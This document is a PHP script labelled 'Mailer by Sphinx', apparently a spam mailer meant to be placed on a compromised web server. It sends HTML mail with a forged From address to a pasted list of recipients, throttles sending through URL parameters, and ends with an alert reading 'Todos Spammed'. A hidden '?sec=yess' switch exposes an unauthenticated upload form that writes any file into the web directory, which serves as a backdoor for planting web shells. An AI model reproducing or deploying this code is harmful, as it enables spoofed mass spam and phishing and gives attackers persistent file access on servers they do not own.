<?php 
@set_time_limit(0); 
if(isset($_POST['Enoc'])) 
{ 
    $message = $_POST['html']; 
    $subject = $_POST['assunto']; 
    $de = $_POST['de']; 
    $nombre = $_POST['RealName']; 
    $ellos = $_POST['ellos']; 

    $message = urlencode($message); 
    $message = ereg_replace("%5C%22", "%22", $message); 
    $message = urldecode($message); 
    $message = stripslashes($message); 

}else{ 
    $testa =""; 
    $message = "<html><body><h1>hola my friend, How are u ?</h1></body></html>"; 
    $subject = $_SERVER["HTTP_HOST"]; 
    $nombre = "mailer"; 
    $de = "info@el-nacional.com"; 
    $ellos = "hidroliksystem@gmail.com"; 
} 
?> 
<html> 
<head> 
<title> Mailer by Sphinx</title></head> 
</head> 
<body style="font-family: Arial; font-size: 11px"> 
<center> 
<form action="" method="post" enctype="multipart/form-data" name="form1"> 
<br><table width="534" height="248" border="0" cellpadding="0" cellspacing="1" bgcolor="#0000CC" class="normal">  
<tr> 
<td> 
<table border="0" bgcolor="#FFFFFF" width="95%"> 
<tr> 
<td> 
<table border="0" width="100%"> 
<tr> 
<td width="359">Email:   <input name="de" type="text" class="form" id="de" size="30" value="<? print $de; ?>"></td> 
<td>Nombre:   <input name="RealName" type="text" class="form" id="RealName" size="30" value="<? print $nombre; ?>"></td> 
</tr> 
</table> 
</td> 
</tr> 
<tr> 
<td>Asunto: <input name="assunto" type="text" class="form" id="assunto" size="78" value="<? print $subject; ?>"></td> 
</tr> 
<tr> 
<td height="18" bgcolor="#C0C0C0"></td> 
</tr> 
<tr> 
<td> 
<table border="0" width="100%"> 
<tr> 
<td> 
<textarea name="html" cols="66" rows="10" id="html"><? print $message; ?></textarea></td> 
<td><textarea rows="10" name="ellos" cols="35"><? print $ellos; ?></textarea></td> 
</tr> 
</table> 
</td> 
</tr> 
<tr> 
<td><center> 
<br><input type="submit" name="Enoc" value="Enviar"></center><br> 
<?php 
if($_GET['sec']=='yess') 
{ 
    echo '<form action="" method="post" enctype="multipart/form-data"> 
        <input name="archivo" type="file" size="35" /> 
        <input name="enviar" type="submit" value="Upload File" /> 
        <input name="action" type="hidden" value="upload" />      
    </form>'; 

    $status = ""; 
    if ($_POST["action"] == "upload") 
    { 
        $tamano = $_FILES["archivo"]['size']; 
        $tipo = $_FILES["archivo"]['type']; 
        $archivo = $_FILES["archivo"]['name']; 
          
        if ($archivo != "") 
        { 
            if (copy($_FILES['archivo']['tmp_name'],"./".$archivo)) 
            { 
                $status = "Archivo subido: <b>".$archivo."</b>"; 
            }else{ 
                $status = "Error al subir el archivo"; 
            } 
        } else { 
            $status = "Error al subir archivo"; 
        } 
        echo $status; 
    } 
} 
if(!isset($_POST['Enoc'])){ 
    exit; 
} 

if(!isset($_GET['c'])) 
{ 
    $email = explode("\n", $ellos); 
}else{ 
    $email = explode(",", $ellos); 
} 
$son = count($email); 

if(!isset($_GET['e'])){ 
    $header = "MIME-Version: 1.0\n"; 
    $header .= "Content-type: text/html; charset=iso-8859-1\n"; 
    $header .= "From: ".$nombre . " <" . $de . ">\n"; 
    $header .= "Reply-To: " . $de . "\n"; 
    $header .= "X-Priority: 3\n"; 
    $header .= "X-MSMail-Priority: Normal\n"; 
    $header .= "X-Mailer: ".$_SERVER["HTTP_HOST"]; 
}else{ 
    $header ='MIME-Version: 1.0' . "\r\n"; 
    $header .= 'Content-type: text/html' . "\r\n"; 
    $header .="From: ".$de; 
} 
$i = 0; 
$voy=1; 
while($email[$i]) 
{ 
    if(isset($_GET['time']) && isset($_GET['cant'])){ 
        if(fmod($i,$_GET['cant'])==0 && $i>0){ 
            print "----------------------------------> wait ".$_GET['time']." Segs. Sending to ".$_GET['notf']."...<br>\n"; 
            flush(); 
            @mail($_GET['notf'], $subject, $message, $header); 
            sleep($_GET['time']); 
        } 
    } 
    $mail = str_replace(array("\n","\r\n"),'',$email[$i]); 
        $message1 = ereg_replace("&email&", $mail, $message); 
    if(@mail($mail, $subject, $message1, $header)) 
    { 
        print "<font color=blue face=verdana size=1>    ".$voy." de ".$son."  ;-) ".trim($mail)."  okey dokey!</font><br>\n"; 
        flush(); 
    } 
    else 
    { 
        print "<font color=red face=verdana size=1>    ".$voy." de ".$son.":-( ".trim($mail)."  Error te digo altoquesein!!</font><br>\n"; 
        flush(); 
    }                                                              
    $i++; 
    $voy++; 
} 
echo "<script> alert('---Todos Spammed---'); </script>"; 
?> 
</td> 
</tr> 
</table> 
</td> 
</tr> 
</table> 
</body> 
</form> 
</center> 
</html>